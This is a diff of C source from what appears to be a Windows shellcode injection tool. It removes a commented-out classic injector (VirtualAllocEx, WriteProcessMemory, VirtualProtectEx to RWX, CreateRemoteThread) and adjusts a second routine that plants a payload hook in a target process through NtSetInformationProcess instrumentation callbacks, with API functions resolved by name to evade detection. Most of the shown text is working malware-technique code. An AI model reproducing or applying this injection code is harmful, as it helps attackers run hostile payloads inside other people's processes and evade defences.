@@ -152,94 +152,13 @@ BOOL PayloadExecute(unsigned char* buffer, int bufferlen)
 #endif
 
 /**
- * The method use in below func is changing memory protection
- */
-
-
-
-//BOOL PayloadInject(HANDLE hProcess, unsigned char* buffer, int bufferlen)
-//{
-//    /**
-//     * buffer: start of shellcode, not include easter egg
-//     */
-//    HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
-//    // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
-//    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);
-//
-//    LPVOID mem = _VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(bufferlen), MEM_COMMIT, PAGE_READWRITE);
-//#ifdef DEBUG
-//    printf("[+] Addr: %p\n", mem);
-//#endif
-//    pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)getFuncByName(kernel32, aWriteProcessMemory);
-//    BOOL check = _WriteProcessMemory(hProcess, mem, buffer, bufferlen, NULL);
-//
-//    if (check)
-//    {
-//#ifdef DEBUG
-//        printf("[+] Write memory to process successfully!\n");
-//#endif
-//    }
-//    else {
-//#ifdef DEBUG
-//        printf("[x] Failed to write memory!\n");
-//        DWORD error = GetLastError();
-//        PrintLastError(error);
-//#endif
-//        return FALSE;
-//    }
-//    // printf("Pause\n");
-//    int d;
-//    scanf("%d", &d);
-//    pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)getFuncByName(kernel32, aVirtualProtectEx);
-//    DWORD oldProtect = PAGE_READWRITE;
-//    check = _VirtualProtectEx(hProcess, mem, bufferlen, PAGE_EXECUTE_READWRITE, &oldProtect);
-//    if (check)
-//    {
-//#ifdef DEBUG
-//        printf("[+] Change memory protection successfully!\n");
-//#endif
-//    }
-//    else {
-//#ifdef DEBUG
-//        printf("[x] Failed to change memory protection!\n");
-//        DWORD error = GetLastError();
-//        PrintLastError(error);
-//#endif
-//        return FALSE;
-//    }
-//
-//    // printf("Pause\n");
-//    scanf("%d", &d);
-//
-//    pCreateRemoteThread _CreateRemoteThread = (pCreateRemoteThread)getFuncByName(kernel32, aCreateRemoteThread);
-//    HANDLE hThread = _CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((char*)mem), NULL, 0, NULL);
-//    if (hThread)
-//    {
-//#ifdef DEBUG
-//        printf("[+] Create remote thread successfully!\n");
-//#endif 
-//    }
-//    else
-//    {
-//#ifdef DEBUG
-//        printf("[x] Failed to create remote thread!\n");
-//        DWORD error = GetLastError();
-//        PrintLastError(error);
-//#endif
-//        return FALSE;
-//    }
-//    pCloseHandle _CloseHandle = (pCloseHandle)getFuncByName(kernel32, aCloseHandle);
-//    // WaitForSingleObject(hThread, INFINITE);
-//    _CloseHandle(hThread);
-//    return TRUE;
-//}
-
-/**
  * This version using the NtSetInformationProcess to add a hook after syscall
  */
 
 BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
 {
+    printf("%d\n%d\n", buffer[0],bufferlen);
+
     HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
     // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
     pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);
@@ -354,7 +273,7 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
     PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION procinfo;
     procinfo.Reserved = 0;
     procinfo.Version = 0;
-    procinfo.Callback = jumper;
+    procinfo.Callback = (PVOID)(ULONG_PTR)jumper;
 
     pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)getFuncByName(kernel32, aLoadLibraryA);
     HMODULE ntdll = _LoadLibraryA(aNtDlldll);
@@ -367,14 +286,13 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
 #endif
         return FALSE;
     }
-    NTSTATUS stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));
+    NTSTATUS stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(procinfo));
 
     if (!NT_SUCCESS(stat))
     {
 #ifdef DEBUG
         printf("[x] Failed to deploy hook!\n");
-        DWORD error = GetLastError();
-        PrintLastError(error);
+        PrintLastError(stat);
 #endif
         return FALSE;
     }
@@ -386,9 +304,6 @@ BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
         return TRUE;
     }
 }
-
-
-
 
 #undef PAGE_SIZE
 #undef PAGE_ALIGN
